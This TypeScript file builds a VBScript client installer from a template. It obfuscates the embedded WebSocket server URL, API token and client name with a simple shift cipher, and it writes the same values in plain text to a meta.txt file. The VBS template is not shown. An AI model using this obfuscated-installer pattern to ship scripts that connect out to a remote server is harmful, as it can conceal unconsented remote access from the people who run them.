import { readFileSync, mkdirSync, writeFileSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { MorphShift } from './utils/MorphShift';

const SHIFT = 3;
const SOURCES_DIR = join(dirname(import.meta.path), '..', 'sources');
const DIST_DIR    = join(dirname(import.meta.path), '..', '..', '..', 'dist-clients', 'vbs-installers');

export interface BuildParams {
    wsUrl: string;
    apiToken: string;
    clientName: string;
}

export interface BuildResult {
    vbsPath: string;
    metaPath: string;
}

interface IClientInstaller {
    build(params: BuildParams): BuildResult;
}

abstract class ClientInstaller implements IClientInstaller {
    abstract build(params: BuildParams): BuildResult;

    protected ensureDistDir(): void {
        mkdirSync(DIST_DIR, { recursive: true });
    }
}

export class ClientVbsInstaller extends ClientInstaller {

    build(params: BuildParams): BuildResult {
        const morphShift = new MorphShift(SHIFT);
        const encodedWsUrl      = morphShift.to(params.wsUrl);
        const encodedApiToken   = morphShift.to(params.apiToken);
        const encodedClientName = morphShift.to(params.clientName);

        const template = readFileSync(join(SOURCES_DIR, 'client_installer.vbs'), 'utf-8');

        const vbsContent = template
            .replace('@@WS_URL@@',      encodedWsUrl)
            .replace('@@API_TOKEN@@',   encodedApiToken)
            .replace('@@CLIENT_NAME@@', encodedClientName);

        this.ensureDistDir();

        const vbsPath  = join(DIST_DIR, 'client_install.vbs');
        const metaPath = join(DIST_DIR, 'meta.txt');

        writeFileSync(vbsPath, vbsContent, 'utf-8');

        const metaContent = [
            `Built: ${new Date().toISOString()}`,
            `WS_URL:       ${params.wsUrl}`,
            `API_TOKEN:    ${params.apiToken}`,
            `CLIENT_NAME:  ${params.clientName}`,
        ].join('\n') + '\n';
        writeFileSync(metaPath, metaContent, 'utf-8');

        return { vbsPath, metaPath };
    }
}

export class ClientInstallerBuilder {

    static createVbsInstaller(): ClientVbsInstaller {
        return new ClientVbsInstaller();
    }
}